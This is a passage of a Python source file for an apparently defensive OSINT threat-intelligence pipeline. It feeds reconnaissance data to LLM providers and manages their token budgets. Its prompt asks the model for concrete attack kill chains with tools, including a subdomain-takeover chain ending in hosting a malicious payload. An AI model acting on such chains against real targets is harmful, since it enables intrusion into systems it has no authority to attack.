"""
ai_analyst.py — Motor de Inteligência do Sentinel OSINT

Pipeline: collector → validator → infra_agent → enrichment_agent → correlator → [ai_analyst]
Providers suportados: groq | openrouter | ollama

Arquitetura Multi-IA (quando Ollama disponível):
  - Ollama local (modelo leve) comprime contexto grande antes de enviar ao Groq
  - Isso resolve truncamento por limite de tokens e reduz custo de API
  - Ativado automaticamente quando contexto > _COMPRESSION_THRESHOLD chars

Fix v1.2 — Token budget corrigido:
  - _estimate_tokens() usa ratio 2.5 chars/token (era 4 — subestimava 58%)
  - _GROQ_INPUT_CHAR_BUDGET recalculado com ratio 2.5
  - _MAX_CONTEXT_CHARS reduzido de 14.000 → 8.000 (ratio correto expõe margem real)
  - _COMPRESSION_THRESHOLD reduzido de 10.000 → 6.000 (dispara antes do safety net)

Fix v1.3 — Budget dinâmico por system prompt real:
  - Bug raiz: 3 Skills = ~27.000 chars / ~10.800 tokens — sozinhas excedem o budget de 8.500
  - _GROQ_INPUT_CHAR_BUDGET era hardcoded e nunca descontava o system prompt
  - call_model() agora mede system_prompt REAL e calcula data_budget_chars dinamicamente
  - run() aplica pre-truncamento ciente do system_prompt antes de chamar call_model()
  - Fallback: se skills > budget, trunca o system_prompt e loga aviso CRITICAL

Fix v1.4 — Budget separado por provider:
  - Bug raiz: limite de 8.500 tokens (Groq free tier) era aplicado ao OpenRouter também
  - OpenRouter + Nemotron 3 Super tem 262K tokens de contexto — 30x maior
  - Groq: mantém lógica de budget rígido (12K TPM)
  - OpenRouter: safety net generoso de 400K chars (~160K tokens) — sem truncamento agressivo
  - Ollama: safety net simples por chars
  - call_openrouter() agora inclui max_tokens para garantir output completo

Fix v1.5 — Timeout de compressão Ollama:
  - Bug raiz: ollama.chat() não aceita parâmetro timeout diretamente
  - Solução: instancia ollama.Client com timeout=30 antes de chamar .chat()
  - Sem timeout, pipeline travava indefinidamente se llama3.2 não respondia na CPU
  - Para remover: substitua _timed_client.chat() por ollama_client.chat() e apague
    as duas linhas de instanciação do _timed_client
"""

import json
import os
import re
from datetime import datetime
from pathlib import Path
from typing import Any, Optional, Union

import requests
from dotenv import load_dotenv
from pydantic import BaseModel, Field, ValidationError

load_dotenv()

import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.logger import get_logger

logger = get_logger(__name__)

SKILLS_DIR = Path("core/skills")
MEMORY_DIR = Path("core/memory")
OUTPUT_DIR = Path("data")

SKILL_FILES = [
    "osint_analyst.md",
    "pentest_reasoning.md",
    "report_format.md",
]

MEMORY_FILES = {
    "patterns"   : MEMORY_DIR / "learned_patterns.json",
    "corrections": MEMORY_DIR / "error_corrections.json",
}

# ── Limites por provider ───────────────────────────────────────────────────
#
# GROQ free tier: 12.000 TPM (tokens por minuto, input + output somados)
#   Output reservado: 3.500 tokens → input budget: 8.500 tokens
#   Ratio 2.5 chars/token → budget real: ~8.000 chars para dados
#
# OPENROUTER + Nemotron 3 Super: 262.144 tokens de contexto
#   Sem limite de TPM restritivo como o Groq free tier
#   Safety net: 400.000 chars (~160.000 tokens) — margem de segurança de 40%
#   Compressão Ollama: desabilitada por padrão (não necessária)
#
# OLLAMA: sem limite de tokens na API, limitado apenas pela RAM/VRAM
#   Safety net: 80.000 chars por conservadorismo

_GROQ_FREE_TPM              = 12_000
_GROQ_MAX_OUTPUT_TOKENS     = 3_500
_GROQ_CHARS_PER_TOKEN       = 2.5

_OPENROUTER_MAX_CONTEXT_CHARS = 400_000   # ~160K tokens — bem dentro dos 262K do Nemotron
_OPENROUTER_MAX_OUTPUT_TOKENS = 8_000     # mais output que o Groq free tier

_OLLAMA_MAX_CONTEXT_CHARS     = 80_000

# Threshold para acionar compressão via Ollama local (apenas Groq)
_COMPRESSION_THRESHOLD        = 6_000

# Limites de truncamento de campos específicos (aplicados antes de montar o contexto)
_MAX_SUBDOMAINS_IN_CONTEXT = 8
_MAX_SANS_IN_CONTEXT       = 6
_MAX_CVE_IN_CONTEXT        = 5    # Groq: 5 | OpenRouter: expandido em _build_enrichment_block
_MAX_BANNER_CHARS          = 60

# Versões expandidas para OpenRouter (contexto grande)
_MAX_CVE_OPENROUTER        = 30
_MAX_SUBDOMAINS_OPENROUTER = 30
_MAX_BANNER_OPENROUTER     = 200


def _estimate_tokens(system: str, context: str) -> int:
    """
    Aproxima o total de tokens enviados ao provider (system + data context).
    Ratio 2.5 chars/token — calibrado empiricamente para conteúdo técnico com CVEs/IPs/JSON.
    """
    return int((len(system) + len(context)) / _GROQ_CHARS_PER_TOKEN)


def _get_provider() -> str:
    return os.getenv("AI_PROVIDER", "groq").lower().strip()


# ── Schemas Pydantic v2.0 ─────────────────────────────────────────────────

class MitreAttack(BaseModel):
    tactic          : Optional[str] = None
    technique       : Optional[str] = None
    technique_id    : Optional[str] = None
    sub_technique_id: Optional[str] = None


class TechnicalDetail(BaseModel):
    what    : Optional[str] = None
    where   : Optional[str] = None
    evidence: Optional[str] = None


class AdversarialImpact(BaseModel):
    immediate_risk: Optional[str] = None
    amplified_risk: Optional[str] = None
    data_at_risk  : Optional[str] = None


class Exploitation(BaseModel):
    complexity        : Optional[str] = None
    prerequisites     : list[str]     = Field(default_factory=list)
    realistic_scenario: Optional[str] = None


class FindingRecommendation(BaseModel):
    priority    : Optional[str] = None
    action      : Optional[str] = None
    verification: Optional[str] = None


class Finding(BaseModel):
    id                : Optional[str]                   = None
    title             : str                             = Field(..., description="Título do achado")
    severity          : str                             = Field(..., description="CRITICAL|HIGH|MEDIUM|LOW|INFO")
    cvss_estimate     : Optional[float]                 = None
    category          : Optional[str]                   = None
    technical_detail  : Optional[TechnicalDetail]       = None
    adversarial_impact: Optional[AdversarialImpact]     = None
    mitre_attack      : Optional[MitreAttack]           = None
    exploitation      : Optional[Exploitation]          = None
    recommendation    : Optional[FindingRecommendation] = None
    description       : Optional[str] = None
    mitre_id          : Optional[str] = None
    mitre_name        : Optional[str] = None
    evidence          : Optional[str] = None

    model_config = {"extra": "allow"}


class KillChainStep(BaseModel):
    step        : Optional[int] = None
    action      : Optional[str] = None
    mitre_ttp   : Optional[str] = None
    tool_example: Optional[str] = None


class AttackHypothesis(BaseModel):
    id                       : Optional[str]       = None
    name                     : Optional[str]       = None
    threat_actor_profile     : Optional[str]       = None
    objective                : Optional[str]       = None
    prerequisites            : list[str]           = Field(default_factory=list)
    kill_chain               : list[KillChainStep] = Field(default_factory=list)
    probability              : Optional[str]       = None
    probability_justification: Optional[str]       = None
    potential_impact         : Optional[str]       = None
    detection_indicators     : list[str]           = Field(default_factory=list)

    model_config = {"extra": "allow"}


class ThreatProfile(BaseModel):
    target_value               : Optional[str] = None
    target_value_justification : Optional[str] = None
    primary_threat_actor       : Optional[str] = None
    threat_actor_motivation    : Optional[str] = None
    attack_surface_category    : Optional[str] = None


class ExecutiveSummary(BaseModel):
    risk_level                : Optional[str] = None
    risk_justification        : Optional[str] = None
    immediate_actions_required: list[str]     = Field(default_factory=list)
    key_attack_vectors        : list[str]     = Field(default_factory=list)

    model_config = {"extra": "allow"}


class BlindSpot(BaseModel):
    area              : Optional[str] = None
    reason            : Optional[str] = None
    impact_on_analysis: Optional[str] = None
    collection_method : Optional[str] = None


class AnalysisOutput(BaseModel):
    threat_profile              : Optional[ThreatProfile]         = None
    executive_summary           : Union[ExecutiveSummary, str]    = Field(default="")
    findings                    : list[Finding]                   = Field(default_factory=list)
    attack_hypotheses           : list[AttackHypothesis]          = Field(default_factory=list)
    blind_spots                 : list[BlindSpot]                 = Field(default_factory=list)
    prioritized_recommendations : list[Any]                       = Field(default_factory=list)
    confidence_assessment       : Optional[dict]                  = None
    infrastructure_intelligence : Optional[dict]                  = None
    domain_intelligence         : Optional[dict]                  = None
    technology_fingerprint      : Optional[dict]                  = None
    reputation_analysis         : Optional[dict]                  = None
    priority_level   : Optional[str] = Field(None, description="CRITICAL|HIGH|MEDIUM|LOW|INFO")
    threat_hypotheses: list[str]     = Field(default_factory=list)
    recommendations  : list[str]     = Field(default_factory=list)
    confidence_score : Optional[int] = Field(None, ge=0, le=100)

    model_config = {"extra": "allow"}


def _error_output(reason: str, raw: str = "") -> dict:
    return {
        "error"            : reason,
        "raw_response"     : raw[:500] if raw else "",
        "priority_level"   : "INDETERMINADO",
        "executive_summary": f"Análise falhou — {reason}",
        "findings"         : [],
        "threat_hypotheses": [],
        "recommendations"  : [],
    }


# ── Skills ────────────────────────────────────────────────────────────────

def load_skills() -> str:
    content: list[str] = []
    for filename in SKILL_FILES:
        path = SKILLS_DIR / filename
        if path.exists():
            content.append(f"## SKILL: {filename}\n{path.read_text(encoding='utf-8')}")
            logger.info(f"[ai_analyst] Skill carregada: {filename}")
        else:
            logger.warning(f"[ai_analyst] Skill não encontrada: {filename}")
    return "\n\n".join(content)


# ── Memória ───────────────────────────────────────────────────────────────

def _load_json_file(path: Path, root_key: str) -> list:
    if not path.exists():
        return []
    try:
        return json.loads(path.read_text(encoding="utf-8")).get(root_key, [])
    except Exception as e:
        logger.error(f"[ai_analyst] Erro ao ler {path.name}: {e}")
        return []


def load_memory() -> dict:
    memory = {
        "patterns"   : _load_json_file(MEMORY_FILES["patterns"],   "patterns"),
        "corrections": _load_json_file(MEMORY_FILES["corrections"], "corrections"),
    }
    logger.info(
        f"[ai_analyst] Memória: {len(memory['patterns'])} patterns | "
        f"{len(memory['corrections'])} corrections"
    )
    return memory


def format_memory(memory: dict) -> str:
    lines: list[str] = []
    if memory["corrections"]:
        lines.append("## CORREÇÕES APRENDIDAS (aplicar sempre)")
        for c in memory["corrections"]:
            lines.append(f"- {c.get('rule', '')}")
    if memory["patterns"]:
        lines.append("## PADRÕES CONHECIDOS")
        for p in memory["patterns"]:
            lines.append(f"- {p.get('pattern', '')}")
    return "\n".join(lines)


def _ensure_memory_file(path: Path, root_key: str) -> dict:
    if not path.exists():
        path.parent.mkdir(parents=True, exist_ok=True)
        initial = {root_key: []}
        path.write_text(json.dumps(initial, indent=2, ensure_ascii=False), encoding="utf-8")
        return initial
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception as e:
        logger.error(f"[ai_analyst] Arquivo corrompido {path.name}, recriando: {e}")
        initial = {root_key: []}
        path.write_text(json.dumps(initial, indent=2, ensure_ascii=False), encoding="utf-8")
        return initial


def save_correction(rule: str, context: str = "") -> bool:
    try:
        path = MEMORY_FILES["corrections"]
        data = _ensure_memory_file(path, "corrections")
        data.setdefault("corrections", []).append({
            "rule": rule, "context": context,
            "created_at": datetime.now().isoformat(),
        })
        path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
        return True
    except Exception as e:
        logger.error(f"[ai_analyst] Falha ao salvar correção: {e}")
        return False


def save_pattern(pattern: str, source: str = "") -> bool:
    try:
        path = MEMORY_FILES["patterns"]
        data = _ensure_memory_file(path, "patterns")
        data.setdefault("patterns", []).append({
            "pattern": pattern, "source": source,
            "created_at": datetime.now().isoformat(),
        })
        path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
        return True
    except Exception as e:
        logger.error(f"[ai_analyst] Falha ao salvar padrão: {e}")
        return False


# ── System Prompt ─────────────────────────────────────────────────────────

def build_system_prompt(skills: str, memory: str) -> str:
    parts = [
        "Você é um motor analítico de Threat Intelligence.",
        "Transforma dados brutos em inteligência acionável.",
        "Retorna APENAS JSON válido — sem texto antes ou depois.",
        "Não use blocos de código markdown. Não escreva nada fora do JSON.",
        "",
        skills,
    ]
    if memory:
        parts += ["", "## MEMÓRIA ATIVA — aplicar em toda análise", memory]

    parts += [
        "",
        "## LIMITE DE OUTPUT — OBRIGATÓRIO",
        "Seja extremamente conciso. Cada campo de string: máximo 80 caracteres.",
        "realistic_scenario: máximo 2 frases. description: máximo 1 frase.",
        "Priorize completar o JSON válido sobre detalhar cada campo.",
    ]

    return "\n".join(parts)


# ── Truncamento de contexto ───────────────────────────────────────────────

def _truncate_enrichment_sources(sources: dict, provider: str = "groq") -> dict:
    """
    Trunca fontes de enriquecimento antes de montar o contexto.
    Provider openrouter usa limites expandidos — aproveita 262K de contexto.
    """
    import copy
    s = copy.deepcopy(sources)

    max_subs    = _MAX_SUBDOMAINS_OPENROUTER if provider == "openrouter" else _MAX_SUBDOMAINS_IN_CONTEXT
    max_cves    = _MAX_CVE_OPENROUTER        if provider == "openrouter" else _MAX_CVE_IN_CONTEXT
    max_banners = _MAX_BANNER_OPENROUTER     if provider == "openrouter" else _MAX_BANNER_CHARS

    subs      = s.get("subdomains", {})
    all_subs: list = subs.get("subdomains", [])
    total     = subs.get("count", len(all_subs))
    if total > max_subs:
        s["subdomains"] = {
            "count" : total,
            "sample": all_subs[:max_subs],
            "note"  : f"{total - max_subs} subdomínios omitidos — total: {total}",
        }

    for shodan in s.get("shodan", []):
        for svc in shodan.get("services", []):
            banner = svc.get("banner", "")
            if len(banner) > max_banners:
                svc["banner"] = banner[:max_banners] + "...[truncado]"
            if len(svc.get("cves", [])) > max_cves:
                svc["cves"] = svc["cves"][:max_cves]
        if len(shodan.get("all_cves", [])) > max_cves:
            shodan["all_cves"] = shodan["all_cves"][:max_cves]

    http = s.get("http", {})
    http.pop("headers", None)
    s["http"] = http

    ssl_data = s.get("ssl", {})
    sans: list = ssl_data.get("sans", [])
    if len(sans) > _MAX_SANS_IN_CONTEXT:
        ssl_data["sans"]      = sans[:_MAX_SANS_IN_CONTEXT]
        ssl_data["sans_note"] = f"{len(sans) - _MAX_SANS_IN_CONTEXT} SANs omitidos"
    s["ssl"] = ssl_data

    return s


def _build_enrichment_block(enrichment_data: dict, provider: str = "groq") -> list[str]:
    s                 = enrichment_data.get("summary", {})
    sources_truncated = _truncate_enrichment_sources(
        enrichment_data.get("sources", {}), provider=provider
    )

    max_subs = _MAX_SUBDOMAINS_OPENROUTER if provider == "openrouter" else _MAX_SUBDOMAINS_IN_CONTEXT
    max_cves = _MAX_CVE_OPENROUTER        if provider == "openrouter" else _MAX_CVE_IN_CONTEXT

    summary_subs: list = s.get("subdomains", [])
    sub_count   = s.get("subdomain_count", len(summary_subs))
    sub_display = ", ".join(summary_subs[:max_subs])
    if sub_count > max_subs:
        sub_display += f" ... (+{sub_count - max_subs} omitidos)"

    summary_cves: list = s.get("cves", [])
    cves_display = ", ".join(summary_cves[:max_cves])
    if len(summary_cves) > max_cves:
        cves_display += f" ... (+{len(summary_cves) - max_cves} omitidos)"

    summary_sans: list = s.get("ssl_sans", [])
    sans_display = ", ".join(summary_sans[:_MAX_SANS_IN_CONTEXT])
    if len(summary_sans) > _MAX_SANS_IN_CONTEXT:
        sans_display += f" ... (+{len(summary_sans) - _MAX_SANS_IN_CONTEXT} omitidos)"

    return [
        "",
        "## INTELIGÊNCIA ENRIQUECIDA",
        "",
        f"Subdomínios ({sub_count}): {sub_display}",
        "",
        f"CVEs indexados ({s.get('total_cves', 0)}): {cves_display}",
        "",
        "Serviços com versão exposta:",
        json.dumps(s.get("exposed_services", []), ensure_ascii=False),
        "",
        f"VirusTotal — engines maliciosas: {s.get('vt_malicious', 0)} "
        f"| threat score: {s.get('vt_threat_score', 0)}",
        "",
        f"AbuseIPDB — score máximo: {s.get('max_abuse_score', 0)}/100 "
        f"| IP abusivo: {s.get('has_abusive_ip', False)}",
        "",
        f"Stack tecnológica: {', '.join(s.get('tech_stack', []))}",
        f"Banner do servidor: {s.get('server_banner', 'não detectado')}",
        "",
        f"Headers de segurança AUSENTES: "
        f"{', '.join(s.get('missing_security_headers', []))}",
        "",
        f"SANs do certificado (outros domínios na mesma infra): {sans_display}",
        f"Wildcard: {s.get('ssl_wildcard')} | "
        f"Expirado: {s.get('ssl_expired')} | "
        f"Expirando em breve: {s.get('ssl_expiring_soon')}",
        "",
        "Portas abertas (todas):",
        json.dumps(s.get("all_open_ports", []), ensure_ascii=False),
    ]


def _build_subdomain_block(subdomain_data: dict) -> list[str]:
    total    = subdomain_data.get("total_found_crt", 0)
    active   = subdomain_data.get("active_count", 0)
    takeover = subdomain_data.get("takeover_candidates", [])

    lines = [
        "",
        "## ENUMERAÇÃO DE SUBDOMÍNIOS (crt.sh + DNS)",
        "",
        f"Total encontrado no crt.sh: {total}",
        f"Ativos (com resolução DNS): {active}",
        f"Candidatos a takeover: {len(takeover)}",
    ]

    if takeover:
        lines.append("")
        lines.append("TAKEOVER CANDIDATES (alta prioridade):")
        for tc in takeover:
            lines.append(
                f"  - {tc.get('name')} → CNAME: {tc.get('cname')} "
                f"| Serviço: {tc.get('takeover_service')}"
            )

    active_list = [
        s for s in subdomain_data.get("subdomains", [])
        if s.get("status") == "resolved"
    ][:_MAX_SUBDOMAINS_IN_CONTEXT]

    if active_list:
        lines.append("")
        lines.append(f"Ativos (amostra de {len(active_list)} de {active}):")
        for s in active_list:
            ips = ", ".join(s.get("ips", []))
            lines.append(f"  - {s['name']} → {ips}")

    return lines


def _build_header_block(header_data: dict) -> list[str]:
    summary  = header_data.get("summary", {})
    findings = header_data.get("findings", [])
    status   = header_data.get("status_code")

    lines = [
        "",
        "## ANÁLISE DE HEADERS HTTP",
        "",
        f"Status HTTP: {status or 'N/A'}",
        f"Total de findings: {summary.get('total_findings', 0)} "
        f"(HIGH: {summary.get('high', 0)} | MEDIUM: {summary.get('medium', 0)} "
        f"| LOW: {summary.get('low', 0)})",
    ]

    if findings:
        lines.append("")
        lines.append("Findings por header:")
        for f in findings:
            sev   = f.get("severity", "?")
            title = f.get("title", "?")
            mid   = f.get("mitre_id", "")
            ev    = f.get("evidence", "")[:60]
            lines.append(f"  [{sev}] {title} | {mid} | {ev}")

    return lines


def _build_analysis_instruction(
    enrichment_data : Optional[dict],
    subdomain_data  : Optional[dict],
    header_data     : Optional[dict],
) -> str:
    has_shodan  = (
        enrichment_data is not None
        and bool(enrichment_data.get("summary", {}).get("exposed_services"))
    )
    has_headers = bool(
        (enrichment_data is not None
         and enrichment_data.get("summary", {}).get("missing_security_headers"))
        or (header_data is not None
            and header_data.get("summary", {}).get("total_findings", 0) > 0)
    )
    has_takeover = (
        subdomain_data is not None
        and subdomain_data.get("takeover_candidates_count", 0) > 0
    )

    header_finding_count = 0
    header_high_count    = 0
    if header_data:
        s = header_data.get("summary", {})
        header_finding_count = s.get("total_findings", 0)
        header_high_count    = s.get("high", 0) + s.get("critical", 0)

    instructions = [
        "",
        "## INSTRUÇÃO DE ANÁLISE",
        "",
        "Analise TODOS os dados acima e retorne JSON conforme o schema das Skills.",
        "Nenhuma fonte de dados deve ser ignorada — cada seção acima gera findings.",
        "",
        "REGRAS DE MITRE ATT&CK — use EXATAMENTE estes IDs por evidência:",
        "  Porta 31337, 4444, 9929 abertas   -> T1571  (Non-Standard Port)",
        "  SSH (22) exposto                  -> T1021.004",
        "  RDP (3389) exposto                -> T1021.001",
        "  SMB (445) exposto                 -> T1021.002",
        "  FTP (21) exposto                  -> T1071.002",
        "  Telnet (23) exposto               -> T1040",
        "  HTTP sem HTTPS / HSTS ausente     -> T1557  (Adversary-in-the-Middle)",
        "  Servico com CVE publico           -> T1190  (Exploit Public-Facing App)",
        "  Header CSP/XFO ausente            -> T1185  (Browser Session Hijacking)",
        "  Info leakage (Server, X-Powered)  -> T1592.002",
        "  PROIBIDO: T1059 para headers. PROIBIDO: T1190 para porta 31337.",
        "",
        "REGRAS DE FINDINGS — gere finding separado para cada categoria presente:",
        "  Porta 31337 aberta               -> CRITICAL | T1571",
        "  SSH com versao exposta           -> HIGH     | T1021.004",
        "  HTTP sem criptografia (HSTS)     -> HIGH     | T1557",
        "  Servico web com CVEs publicos    -> HIGH/CRITICAL | T1190",
        "  Headers criticos ausentes (CSP, XFO, Permissions) -> MEDIUM | T1185",
        "  Info leakage (Server, X-Powered-By) -> LOW  | T1592.002",
        "  Cookies sem flags (Secure, HttpOnly) -> MEDIUM | T1185",
    ]

    if header_finding_count > 0:
        instructions += [
            "",
            f"ATENCAO: O header_agent ja identificou {header_finding_count} findings "
            f"({header_high_count} HIGH/CRITICAL) na secao ANALISE DE HEADERS HTTP acima.",
            "INCORPORE TODOS como findings no output. Agrupe por tema.",
        ]

    instructions += [
        "",
        "REGRAS DE KILL CHAIN — todo finding MEDIUM+ exige minimo 3 passos CONCRETOS.",
        "Passos vagos como explorar o servico ou obter acesso sao INVALIDOS.",
        "Cada passo deve ter acao especifica + ferramenta quando aplicavel + TTP MITRE.",
        "",
        "HIPOTESES — minimo 2:",
        "  H-001: caminho de menor resistencia (atacante oportunista em 1h)",
        "  H-002: maior impacto potencial (APT ou ransomware)",
        "  Cada hipotese: kill_chain min 3 passos + probability_justification + detection_indicators.",
    ]

    if has_takeover:
        instructions += [
            "",
            "TAKEOVER CANDIDATES detectados -> finding CRITICAL para cada um.",
            "Kill chain: 1. Identificar CNAME nao reivindicado",
            "            2. Registrar conta no servico (GitHub Pages, Heroku, etc)",
            "            3. Reivindicar subdominio e hospedar payload malicioso",
            "MITRE: T1584.001",
        ]

    if has_shodan:
        instructions += [
            "",
            "Versao exposta com CVE indexado -> HIGH ou CRITICAL com cvss_estimate.",
            "Versao sem CVE confirmado -> MEDIUM com justificativa explicita.",
        ]

    if has_headers:
        instructions += [
            "",
            "Headers em conjunto: HSTS ausente = HIGH | CSP+XFO+Permissions = MEDIUM | leakage = LOW.",
        ]

    return "\n".join(instructions)


# ── Providers ─────────────────────────────────────────────────────────────

def _ollama_available() -> bool:
    try:
        r = requests.get("http://localhost:11434", timeout=3)
        return r.status_code == 200
    except Exception:
        return False


def _compress_context_ollama(context: str) -> str:
    compress_model = os.getenv("OLLAMA_PREPROCESSOR_MODEL", "llama3.2").strip()

    if not _ollama_available():
        logger.info("[ai_analyst] Ollama não disponível — compressão ignorada")
        return context

    logger.info(
        f"[ai_analyst] Comprimindo contexto ({len(context)} chars) "
        f"via Ollama/{compress_model}..."
    )

    compression_prompt = (
        "Você é um preprocessador de dados de segurança. "
        "Sua única tarefa é resumir os dados abaixo mantendo todos os "
        "fatos técnicos relevantes: portas, versões, CVEs, headers ausentes, "
        "subdomínios de risco, scores de reputação, datas críticas. "
        "Remova dados redundantes e formatação desnecessária. "
        "Mantenha os dados numéricos exatos. "
        "Retorne apenas o resumo, sem explicação."
    )

    try:
        import ollama as _ollama_module

        # FIX v1.5 — ollama.chat() não aceita timeout como parâmetro direto.
        # Instancia o Client com timeout configurado para evitar travamento
        # indefinido quando o modelo local não responde (CPU lenta, modelo
        # não carregado, etc). Após 30s desiste e usa contexto original.
        # Para remover este fix: substitua _timed_client.chat() por
        # ollama_module.chat() e apague as duas linhas de instanciação abaixo.
        _timed_client = _ollama_module.Client(
            host="http://localhost:11434",
            timeout=30,
        )
        response = _timed_client.chat(
            model=compress_model,
            messages=[
                {"role": "system", "content": compression_prompt},
                {"role": "user",   "content": context},
            ],
            options={"temperature": 0.0, "num_predict": 4000},
        )
        compressed = response["message"]["content"]
        logger.info(
            f"[ai_analyst] Contexto comprimido: "
            f"{len(context)} → {len(compressed)} chars "
            f"({100 - int(len(compressed)/len(context)*100)}% redução)"
        )
        return compressed
    except Exception as e:
        logger.warning(f"[ai_analyst] Compressão Ollama falhou: {e} — usando contexto original")
        return context


def call_groq(system_prompt: str, data_context: str, model: str) -> str:
    api_key = os.getenv("GROQ_API_KEY")
    if not api_key:
        raise ValueError("GROQ_API_KEY não encontrada no .env")
    logger.info(f"[ai_analyst] Groq → modelo: {model}")
    response = requests.post(
        "https://api.groq.com/openai/v1/chat/completions",
        headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
        json={
            "model"      : model,
            "temperature": 0.1,
            "max_tokens" : _GROQ_MAX_OUTPUT_TOKENS,
            "messages"   : [
                {"role": "system", "content": system_prompt},
                {"role": "user",   "content": data_context},
            ],
        },
        timeout=120,
    )
    if response.status_code != 200:
        raise RuntimeError(f"Groq retornou {response.status_code}: {response.text[:300]}")
    return response.json()["choices"][0]["message"]["content"]


def call_openrouter(system_prompt: str, data_context: str, model: str) -> str:
    api_key = os.getenv("OPENROUTER_API_KEY")
    if not api_key:
        raise ValueError("OPENROUTER_API_KEY não encontrada no .env")
    logger.info(f"[ai_analyst] OpenRouter → modelo: {model}")
    response = requests.post(
        "https://openrouter.ai/api/v1/chat/completions",
        headers={
            "Authorization": f"Bearer {api_key}",
            "Content-Type" : "application/json",
            "HTTP-Referer" : "https://github.com/PabloHenrickk/sentinel-osint",
            "X-Title"      : "Sentinel OSINT",
        },
        json={
            "model"      : model,
            "temperature": 0.1,
            "max_tokens" : _OPENROUTER_MAX_OUTPUT_TOKENS,
            "messages"   : [
                {"role": "system", "content": system_prompt},
                {"role": "user",   "content": data_context},
            ],
        },
        timeout=180,
    )

    raw = response.json()

    # Log completo da resposta para diagnóstico — remove após estabilizar
    if response.status_code != 200 or "choices" not in raw:
        logger.error(
            f"[ai_analyst] OpenRouter resposta inesperada "
            f"(status={response.status_code}): {json.dumps(raw)[:500]}"
        )
        raise RuntimeError(
            f"OpenRouter retornou {response.status_code} sem 'choices': "
            f"{json.dumps(raw)[:300]}"
        )

    return raw["choices"][0]["message"]["content"]


def call_ollama(system_prompt: str, data_context: str, model: str) -> str:
    logger.info(f"[ai_analyst] Ollama → modelo: {model}")
    try:
        import ollama as ollama_client
    except ImportError:
        raise RuntimeError("Pacote 'ollama' não instalado. Execute: pip install ollama")
    response = ollama_client.chat(
        model=model,
        messages=[
            {"role": "system", "content": system_prompt},
            {"role": "user",   "content": data_context},
        ],
        options={"temperature": 0.1, "num_predict": 4000},
    )
    return response["message"]["content"]


def call_model(system_prompt: str, data_context: str) -> str:
    provider = _get_provider()
    model    = os.getenv("AI_MODEL", "llama-3.3-70b-versatile").strip()
    fallback = os.getenv("OLLAMA_FALLBACK_MODEL", "").strip()

    logger.info(f"[ai_analyst] Provider: {provider} | Modelo: {model}")

    if provider == "groq":
        _C2T               = _GROQ_CHARS_PER_TOKEN
        input_token_budget = _GROQ_FREE_TPM - _GROQ_MAX_OUTPUT_TOKENS

        system_tokens      = int(len(system_prompt) / _C2T)
        data_budget_tokens = input_token_budget - system_tokens
        data_budget_chars  = int(max(0, data_budget_tokens) * _C2T)

        logger.info(
            f"[ai_analyst] System prompt: {system_tokens} tokens | "
            f"Budget para dados: {data_budget_tokens} tokens ({data_budget_chars} chars)"
        )

        if data_budget_tokens < 500:
            max_system_chars = int((input_token_budget - 500) * _C2T)
            logger.critical(
                f"[ai_analyst] Skills muito grandes ({system_tokens} tokens) — "
                f"excedem o budget de {input_token_budget} tokens. "
                f"Truncando system_prompt para {max_system_chars} chars. "
                f"AÇÃO NECESSÁRIA: reduza os arquivos .md em core/skills/."
            )
            system_prompt      = system_prompt[:max_system_chars] + "\n...[skills truncadas — arquivos .md muito grandes]"
            system_tokens      = int(len(system_prompt) / _C2T)
            data_budget_tokens = input_token_budget - system_tokens
            data_budget_chars  = int(data_budget_tokens * _C2T)

        if len(data_context) > _COMPRESSION_THRESHOLD:
            logger.info(f"[ai_analyst] Comprimindo contexto via Ollama (Groq budget)...")
            data_context = _compress_context_ollama(data_context)

        if len(data_context) > data_budget_chars:
            logger.warning(
                f"[ai_analyst] Truncando data_context: "
                f"{len(data_context)} → {data_budget_chars} chars "
                f"(budget real para dados: {data_budget_tokens} tokens)."
            )
            data_context = (
                data_context[:data_budget_chars]
                + "\n...[truncado por orçamento de tokens do provider]"
            )

        estimated = _estimate_tokens(system_prompt, data_context)
        logger.info(
            f"[ai_analyst] Total estimado final: {estimated} tokens | Budget: {input_token_budget}"
        )

    elif provider == "openrouter":
        context_len = len(system_prompt) + len(data_context)
        logger.info(
            f"[ai_analyst] OpenRouter — contexto total: {context_len} chars "
            f"({int(context_len / _GROQ_CHARS_PER_TOKEN):,} tokens estimados) | "
            f"Limite do modelo: 262K tokens"
        )
        if len(data_context) > _OPENROUTER_MAX_CONTEXT_CHARS:
            logger.warning(
                f"[ai_analyst] data_context excede safety net OpenRouter "
                f"({len(data_context)} > {_OPENROUTER_MAX_CONTEXT_CHARS} chars). Truncando."
            )
            data_context = (
                data_context[:_OPENROUTER_MAX_CONTEXT_CHARS]
                + "\n...[truncado por safety net — contexto excepcionalmente grande]"
            )

    elif provider == "ollama":
        if len(data_context) > _OLLAMA_MAX_CONTEXT_CHARS:
            logger.warning(
                f"[ai_analyst] Safety net Ollama: "
                f"{len(data_context)} → {_OLLAMA_MAX_CONTEXT_CHARS} chars"
            )
            data_context = data_context[:_OLLAMA_MAX_CONTEXT_CHARS] + "\n...[truncado]"

    # ── Roteamento de provider ────────────────────────────────────────────
    if provider == "groq":
        try:
            return call_groq(system_prompt, data_context, model)
        except Exception as e:
            if not fallback:
                raise RuntimeError(
                    f"Groq falhou e OLLAMA_FALLBACK_MODEL não configurado: {e}"
                ) from e
            logger.warning(f"[ai_analyst] Groq falhou ({e}). Verificando Ollama...")
            if not _ollama_available():
                raise RuntimeError(
                    f"Groq falhou e Ollama não está rodando. Inicie com: ollama serve"
                ) from e
            logger.info(f"[ai_analyst] Fallback → Ollama/{fallback}")
            return call_ollama(system_prompt, data_context, fallback)

    elif provider == "openrouter":
        try:
            return call_openrouter(system_prompt, data_context, model)
        except Exception as e:
            if not fallback:
                raise RuntimeError(
                    f"OpenRouter falhou e OLLAMA_FALLBACK_MODEL não configurado: {e}"
                ) from e
            logger.warning(f"[ai_analyst] OpenRouter falhou ({e}). Verificando Ollama...")
            if not _ollama_available():
                raise RuntimeError("OpenRouter falhou e Ollama não está rodando.") from e
            logger.info(f"[ai_analyst] Fallback → Ollama/{fallback}")
            return call_ollama(system_prompt, data_context, fallback)

    elif provider == "ollama":
        if not _ollama_available():
            raise RuntimeError("Ollama não está rodando. Inicie com: ollama serve")
        return call_ollama(system_prompt, data_context, model)

    else:
        raise ValueError(
